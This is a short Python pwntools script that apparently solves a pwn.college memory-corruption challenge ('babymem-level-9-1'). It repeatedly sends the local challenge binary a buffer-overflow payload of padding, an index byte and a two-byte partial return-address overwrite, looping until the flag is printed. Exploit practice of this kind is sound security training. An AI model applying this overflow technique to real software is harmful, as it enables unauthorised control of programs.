from pwn import *

while True:
  p = process('/challenge/babymem-level-9-1')
  p.recvuntil(b'Payload size:')
  p.sendline(b'106')

  payload = b'A' * 80 + p8(103) + p16(0x22cb)

  p.recvline(b'Send your payload')
  p.sendline(payload)

# p.interactive()
  str = p.recvall(1)
    #print(str)
  if str.find(b'pwn.college{') != -1:
    print(str)
    break
